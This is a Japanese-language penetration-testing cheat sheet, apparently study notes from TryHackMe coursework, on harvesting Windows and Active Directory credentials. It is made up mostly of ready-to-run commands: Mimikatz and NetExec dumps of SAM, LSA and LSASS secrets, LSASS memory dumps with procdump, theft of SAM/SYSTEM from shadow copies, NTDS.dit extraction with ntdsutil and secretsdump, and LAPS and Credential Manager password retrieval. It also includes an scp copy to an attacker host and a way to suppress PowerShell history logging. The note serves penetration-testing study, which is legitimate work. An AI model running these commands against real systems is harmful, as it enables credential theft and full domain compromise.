---
---
- 関連ノート：
	- [🥝Mimikatz](../../../Tools/🥝Mimikatz.md)
	- [🔍Windows Local Enumeration](../🔍Windows%20Local%20Enumeration.md)

---

# Auto collector

## Snaffler

- 🔗[Snaffler](https://github.com/SnaffCon/Snaffler)とは、Windows/AD環境の中から、資格情報などの価値ある情報を効率的に探し出すためのツール
```powershell
# 標準的な列挙（トラフィック大）
.\Snaffler.exe -s -o <outputfile> [-n <target>]

# 特定パスに絞った列挙
.\Snaffler.exe -s -o <outputfile> [-n <target>] -i <path>

# 共有リストに絞って列挙
.\Snaffler.exe -s -a -o <outputfile>
```

## Lazagne

- 🔗[Lazagne](https://github.com/AlessandroZ/LaZagne/releases/)
- 基本は管理者権限で使用する
- 一般ユーザー権限でも使えるが、機能は<u>大幅に制限</u>される
```powershell
.\LaZagne.exe all -oN -output <output_dir>
```

## NetExec

- リモートからの実行が可能
- ターゲット環境のローカル管理者権限が必要
```zsh
# from sam
nxc smb <target_IP> -u <username> -p <pw> --sam [secdump]

# from lsa
nxc smb <target_IP> -u <username> -p <pw> --lsa [secdump]

# from lsass
nxc smb <target_IP> -u <username> -p <pw> -M lsassy

# from DPAPI
nxc smb <target_IP> -u <username> -p <pw> --dpapi
```
- ユーザーがローカルユーザーなら、`--local-auth`を付与

### 補足：各nxcの出力内容の違い

| コマンド        | 対象                    | 取得できる認証情報                                                                                               | 特徴                                                                |
| ----------- | --------------------- | ------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `--sam`     | `HKLM\SAM` レジストリ      | • ローカルユーザー名  <br>• NTLMハッシュ  <br>• RID                                                                  | • ディスク上のデータ  <br>• ドメインユーザーは含まない  <br>• 平文パスワードなし                 |
| `--lsa`     | `HKLM\SECURITY` レジストリ | • LSA Secrets(サービスアカウント平文PW)  <br>• ドメインキャッシュ資格情報(DCC/DCC2)  <br>• DPAPI マスターキー  <br>• NL$KM(機械アカウントキー) | • ディスク上のデータ  <br>• ドメイン環境で特に有用  <br>• 過去にログインしたドメインユーザー           |
| `-M lsassy` | `lsass.exe` プロセスメモリ   | • **平文パスワード**(WDigest有効時)  <br>• NTLMハッシュ  <br>• Kerberos チケット(TGT/TGS)  <br>• CredSSP資格情報              | • **最も情報量が多い**  <br>• 現在ログイン中のユーザーのみ  <br>• メモリダンプのためEDR検知リスク     |
| `--dpapi`   | ユーザープロファイル            | • DPAPI マスターキー  <br>• 保存されたブラウザパスワード  <br>• WindowsCredential Managerの内容  <br>• RDP保存資格情報               | • ユーザーごとのデータ  <br>• ブラウザ/アプリの保存パスワード復号に使用  <br>• `--lsa`と組み合わせて使用 |

## Mimikatz

- [🥝Mimikatz](../../../Tools/🥝Mimikatz.md)
- 管理者権限が必要
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

---

# 興味深い情報の列挙

## 目的

- 保存されたパスワードやキャッシュされた資格情報を取得し、横展開や特権昇格を実行する
- 直接的な認証情報ではなくても、パスワードポリシーやエンコードされた機密情報などを探索する
- **権限昇格後も**、高権限でのみアクセスできるファイルを列挙する

## 留意点

- Standard User（一般ユーザー）はホームディレクトリ配下のファイルのみ閲覧可能であることが多いため、ルートディレクトリから再帰探索してヒットしたファイルにアクセスできない場合がある
	- →ゴミ情報が多いので、**ルートディレクトリから探索は避ける**
- 以下のディレクトリで検索すること
	- ①ユーザーのホームディレクトリ
	- ②[🔍 Credentials Harvesting](#インストール済みアプリケーションの列挙)で判明したアプリケーションの`Install Location`
	- ③ユーザーのホームディレクトリから一階層上がったディレクトリ→さらに一階層あがったディレクトリ...
	- ④`C:\`ディレクトリ：==通常の構成と異なるディレクトリがあれば==要注目
- 興味深い情報がエンコードされていて簡単に読み取れない可能性もある
- 隠し属性のついたファイルは、`ls -Force`で表示できる

## 興味深い情報の列挙コマンド

無人インストール用ファイルから認証情報があるか探索
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unatend\Unattend.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml
```

ファイルの再帰的検索
```powershell
ls -Path <path> -Include '<検索キーワード（ワイルドカード使用可）>' -File -Recurse -ErrorAction SilentlyContinue
```
```cmd
tree /f /a <path> | findstr /R "\.txt$ \.ini$"
```

パスに'pass'を含むファイル・ディレクトリ
```cmd
dir .\*pass* /S /B 2>nul
```

カレントディレクトリ配下のファイルの中身に'password' or 'pass'を含むファイルを列挙（部分一致）(Case-insensitive)
```powershell
# エラーが多い場合は、1行目と2行目末尾に-ErrorAction SilentlyContinueを追加
ls -Recurse -Include *.txt,*.ini,*.cfg,*.config,*conf,*.xml,*.git,*.ps1,*.yml -File | Select-String -Pattern "pass(word)?|pwd|cred(ential)?" -List | Select-Object -ExpandProperty Path
```

自動ログオンやリモート接続用に保存された認証情報を表示
```powershell
cmdkey /list
```
- "Saved for this logon only"：揮発性のセッション情報で、ログアウトすれば消滅するため、優先度低い

環境変数の確認
```powershell
ls env:
```
- アプリケーションの認証情報を手入力せずに済むよう、利便性のために、AppKeyなどの一般的でない環境変数にパスワードを保存していることがある

IISが動作している場合は、IISの`web.config`に保存された認証情報を表示
```cmd
type "C:\inetpub\wwwroot\web.config" | findstr connectionString
```
	or
```cmd
findstr /s /i "connectionString" "C:\Windows\Microsoft.NET\Framework*\*\Config\web.config"
```

Putty（WindowsのSSHクライアント）が使われている場合は、セッション情報に認証情報が保存されている可能性がある
```powershell
reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions" /s
```

気になるバイナリがあれば文字列を確認
```powershell
# target
scp .\<binary_file> <attacker_username>@<attacker_IP>:/home/<attacker_username>
```
```zsh
# attacker
strings <binary_file>
strings -e l <binary_file> # UTF16-LE
```

権限昇格後、Administratorのみが読み取れるディレクトリを列挙
```powershell
ls -Path C:\ -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
    $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
    if ($acl) {
        $hasAdmin = $acl.Access | Where-Object { $_.IdentityReference -like "*Administrator*" }
        $hasPublic = $acl.Access | Where-Object { $_.IdentityReference -match "Users|Everyone|Authenticated Users" }
        $hasAdmin -and -not $hasPublic
    }
} | Select-Object FullName | Where-Object -Property FullName -notlike "*\Prefetch\*"
```

>[!NOTE]
>- 出力とモレが多いので、あたりをつけるくらいの認識で使用すること
>- その他、インストールされたアプリケーションのconfigファイルやセッションに認証情報が保存されている可能性もあるため、必ず確認すること

---

# PowerShellのログの探索

## 目的

 PowerShellのログ（トランスクリプトなど）に記録された非常に価値のある情報を探索する。

## PowerShellのログ内容確認コマンド

ユーザーのPowerShellヒストリー（一時的な履歴）を表示
```powershell
Get-History
```

PSReadlineモジュールのログ記録パス表示
	→表示されたファイルパスを`type`
```powershell
(Get-PSReadlineOption).HistorySavePath
```
- `Get-PSReadlineOption`というモジュールの、`HistorySavePath`というオプションを取得する
- 記録パスがあっても、ファイルの中身があるとは限らない(PathNotFoundと表示される)

## PowerShellのログ内容確認 w/ Event Viewer

1. GUIアクセスし、Event Viewerを開く
2. Application and services Logs -> Microsoft -> Windows -> PowerShell -> Operationalを開く
3. 右ペインのActionsで絞り込む：
	- Filter Current Log：Event ID *4104* = Script Block Logging（※）でフィルター
		- （※）PowerShellが関与するものすべての記録。デフォルトでは無効。
	- もしくは、Find：ScriptBlockで検索

![](../../../Images/Pasted%20image%2020250804074835.png)

$$EventViewerのイメージ$$

### 補足：履歴の種類

1. `Get-History` コマンドで見える履歴
    - →`Clear-History`で簡単に削除可能。

2. PSReadline モジュールによる履歴
    - （PowerShell v5以降に導入）
    - **`ConsoleHost_history.txt`** というファイルに保存される
    - `Clear-History`では削除されない
    - 保存しないようにするには、以下コマンドを実行する
```powershell
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

---

# Security Account Manager (SAM) x SYSTEM

## 目的

- SAM（Security Account Manager）からローカルアカウントの資格情報（NTLMハッシュなど）を保持するデータベース
- SAMを復号するために、SYSTEM ハイブに保存されているブートキーが必須
- 条件：管理者権限

## Registry Hives からの取得

[SAM・SYSTEMハイブ悪用による権限昇格](../💥Windows%20Privilege%20Escalation.md#SAM・SYSTEMハイブ悪用による権限昇格)

## Volume Shadow Copy Service (VSS) を利用した取得

1. ターゲット上でシャドウコピーを作成（cmd.exeはrun as administrator)
```cmd
wmic shadowcopy call create Volume='C:\'
```

2. 作成されたシャドウコピーを確認
```cmd
vssadmin list shadows
```
- ↓出力の `Shadow Copy Volume:` にパスが表示される
```
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
```

3. シャドウコピーから SAM / SYSTEM をコピー
```cmd
copy <ShadowCopyPath>\windows\system32\config\sam <output_path>
copy <ShadowCopyPath>\windows\system32\config\system <output_path>
```

4. ローカルマシンにダウンロードし、復号
```zsh
impacket-secretsdump -sam <SAMデータベースのファイルフルパス> -system <システムレジストリファイルのフルパス> LOCAL
```

---

# Local Security Authority Subsystem Service (LSASS)

## 目的

- メモリに保存されているすべての認証情報を抽出する
- 条件：管理者権限

## GUIの方法

1. Task Managerを開く -> Detailsタブへ -> lsass.exeファイルを右クリック -> Create dump file
 
 ![ 380](../../../Images/Pasted%20image%2020230602114024.png)
 

2.  ダンプされたプロセスをMimikatzフォルダにコピー
```cmd
copy <path_to_lsass.DMP> C:\Tools\Mimikatz\lsass.DMP
```

3. Mimikatzで解析
```cmd
.\mimikatz.exe "sekurlsa::minidump lsass.DMP" exit
```

## Sysinternals Suiteの方法

- GUIが使えない場合の代替手段
- 🔗[Sysinternals Suite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)のProcdumpを使用する
- AntiVirus製品に検知されやすい
```cmd
procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
```

---

# Windows Credential Manager

## 目的

- Webサイト、アプリケーション、およびネットワークのログオンに関する重要な情報を取得する
- 条件：管理者権限

##  Credential Managerからのダンプ

1. Windowsターゲットで利用可能な現在のWindows vaultsをリストアップ
```cmd
vaultcmd /list
```
- デフォルトでは、Windowsには2つのvaultがあり、1つはWeb用、もう1つはWindowsマシンCreds用
- GUIでは、Control Panel -> User Accounts -> Credential Managerからアクセスできる

![](../../../Images/Pasted%20image%2020230602142505.png)


2. Web Credentials vaultに保存されているクレデンシャルがあるかどうかを確認する
```cmd
VaultCmd /listproperties:"Web Credentials"
```
- 保存されているクレデンシャルがあれば、`Number of credentials`に表示される

3. 保存されているクレデンシャルの詳細情報をリストアップ
```cmd
VaultCmd /listcreds:"Web Credentials"
```
- `Hidden : No`となっていてパスワードが見れない時がある

4. 🔗[Get-WebCredentials.ps1 - nishang - GitHub](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)を使用
```powershell
Import-Module .\Get-WebCredentials.ps1
Get-WebCredentials
```
- ↓出力例

![](../../../Images/Pasted%20image%2020230602143342.png)

### 補足：Credentials Managerとは

- Webサイト、アプリケーション、およびネットワークのログオンに関する重要な情報を保存するWindowsの機能
- Credsはユーザのフォルダに保存され、Windowsのユーザアカウント間で共有されない
- ただし、メモリ上にキャッシュされる

カテゴリ：
- Web Creds : インターネットブラウザやその他のアプリケーションに保存されているCredsが含まれる
- Windows Creds : NTLM や Kerberos などの Windows 認証の詳細が含まれる
- Generic Creds : 平文のユーザ名とパスワードなど、基本的なCredsの詳細が含まれる
- 証明書ベースのクレデンシャル：証明書に基づくCredsの詳細が含まれる

---

# NTDS.dit

## NTDS ドメインコントローラ

- New Technologies Directory Services (NTDS)は、オブジェクト、属性、Credsなど、すべてのADデータを含むDB
- NTDS.ditのデータは、次の3つのテーブルで構成されている：
	- スキーマテーブル：オブジェクトの種類とその関係
	- リンクテーブル：オブジェクトの属性とその値
	- データテーブル：ユーザーとグループ（オブジェクトの実データを格納する主テーブル）

- NTDSは、デフォルトで`C:\Windows\NTDS`にあり、ターゲットマシンからのデータ抽出を防ぐために暗号化されている

- しかし、様々な方法でアクセスすることが可能で、特に*ntdsutil*と*Diskshadow*ツールを使用してNTDSファイルをダンプできる
- 復号には、SECURITYファイルシステムに格納されているシステムブートキーが必要

## Ntdsutil

- Ntdsutilは、ADの設定を管理・維持するためのWindowsユーティリティ(🔗[Ntdsutil](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)))

- 条件：DCの管理者アクセス権限
- NTDSファイルの内容を正常にダンプするためには、以下のファイルが必要
	- `C:\Windows\NTDS\ntds.dit`
	- `C:\Windows\System32\config\SYSTEM`
	- `C:\Windows\System32\config\SECURITY`

1. Ntdsutilツールを使って、NTDSファイルをダンプするワンライナーPowerShellコマンド
```cmd
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
- `'ac i ntds'`: Active Directoryインスタンスでntdsをinstallする
- `ifm`: Install From Mediaの略で、AD DBをバックアップする
- `create full`: 完全なバックアップを作成し、指定したパスに保存する
- `q q`: 最初の`q`は`ifm`の終了、2回目の`q`は`ntdsutil.exe`の終了

2. `c:\temp`ディレクトリを確認すると、Active Directoryとregistryの2つのフォルダがあり、この中に必要な3つのファイルが含まれているため、これらを攻撃者のマシンに転送する

3. secretsdump.pyスクリプトを実行して、ダンプされたメモリファイルからハッシュを抽出する
```zsh
impacket-secretsdump -security <path_to_SECURITY> -system <path_to_SYSTEM> -ntds <path_to_ntds.dit> LOCAL
```

---

# Local Administrator Password Solution (LAPS)

## 目的

- LAPS機能が有効になっている場合に、AD環境内のローカル管理者パスワードを取得する

| 特徴    | Group Policy Preferences (GPP) | LAPS (Local Administrator Password Solution) |
| ----- | ------------------------------ | -------------------------------------------- |
| 主な目的  | レジストリ、ファイル、ユーザー作成など広範な設定       | ローカル管理者パスワードの管理に特化                           |
| パスワード | 全 PC で共通（固定値）になりがち             | PC ごとに固有・ランダム                                |
| 有効期限  | なし（手動で変えない限りそのまま）              | 自動的にローカルで定期変更（ローテーション）                       |
| 安全性   | 極めて低い（誰でも解読可能な仕組み）             | 高い（AD 上に暗号化して保存、権限者のみ閲覧）                     |

## Enumerate for LAPS

1. ターゲットマシーンにLAPSがインストールされているかどうかを確認する
```cmd
dir "C:\Program Files\LAPS\CSE"
```
- →admpwd.dllのパスが確認できればOK（`AdmPwd`）

2. LAPS を扱い、"All extended rights"属性を持つOU を見つける
```powershell
Find-AdmPwdExtendedRights -Identity <OU_Target>
```
- 利用可能なすべての OU を一覧表示するには、`-Identity *` を使用

![](../../../Images/Pasted%20image%2020230602175950.png)

3. ExtendedRightHoldersをもつグループのメンバーを確認する
```powershell
# 上記例：net groups "LAPsReader"
net groups "<GroupName>"
```

## Getting the Password

1. "ExtendedRightHolders"をもつユーザをクラッキング

2. 入手したCredsでRunAsする
```cmd
runas /savecred /user:[domain]\<username> cmd.exe
```

3. LAPSが有効になっているマシン名を入手する：🔗[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)
```powershell
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers
```

4. LAPSが有効になっているマシンのパスワードを入手する
```powershell
Get-AdmPwdPassword -ComputerName <MachineName>
```

---

# Server Manager Description

Descriptionにメモとしてパスワードを残していることがある。

- 条件：
	- サーバーへGUIアクセスできること
	- 管理者権限

1. Toolsタブ >   Active Directory Users and Computersを選択
	- Toolsの中にはEvent Viewerなど、さまざまなツールがある
 
 ![ 400](../../../Images/Pasted%20image%2020230421110906.png)
 

2. Descriptionの中にサービスアカウントのパスワードがある

![ 500](../../../Images/Pasted%20image%2020230421111143.png)

---

# Other Attacks

## SMB Relay Attack

- [Exploiting Authentication Relays](../../../TryHackME/Offensive%20Pentesting/Active%20Directory/5.%20Exploiting%20Active%20Directory.md#Exploiting%20Authentication%20Relays)

## LLMNR/NBNS Poisoning

[Authentication Relays](../../../TryHackME/Offensive%20Pentesting/Active%20Directory/2.%20Breaching%20Active%20Directory.md#Authentication%20Relays)

- SMBリレーやLLMNR/NBNSポイズニング攻撃の最終目標は、被害者の認証NTLMハッシュを取得し、被害者のアカウントやマシンへのアクセス権を取得すること
